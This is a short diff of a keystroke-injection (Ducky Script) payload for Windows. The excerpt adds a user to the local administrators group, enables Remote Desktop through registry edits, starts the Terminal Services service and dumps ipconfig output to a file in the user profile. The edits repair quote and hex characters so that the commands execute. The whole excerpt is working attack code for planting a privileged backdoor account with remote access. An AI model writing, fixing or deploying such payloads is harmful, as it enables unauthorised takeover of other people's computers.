@@ -18,10 +18,10 @@ DELAY 400
 STRING net localgroup administrators username /add
 ENTER
 DELAY 400
-STRING reg add “hklm\system\currentControlSet\Control\Terminal Server” /v “AllowTSConnections” /t REG_DWORD /d 0×1 /f
+STRING reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
 ENTER
 DELAY 400
-STRING reg add “hklm\system\currentControlSet\Control\Terminal Server” /v “fDenyTSConnections” /t REG_DWORD /d 0×0 /f
+STRING reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0x0 /f
 ENTER
 DELAY 400
 STRING sc config TermService start= auto
@@ -30,7 +30,7 @@ DELAY 400
 STRING net start Termservice
 ENTER
 DELAY 400
-STRING cd USERPROFILE
+STRING cd %USERPROFILE%
 ENTER
 DELAY 400
 STRING ipconfig /all > number.txt
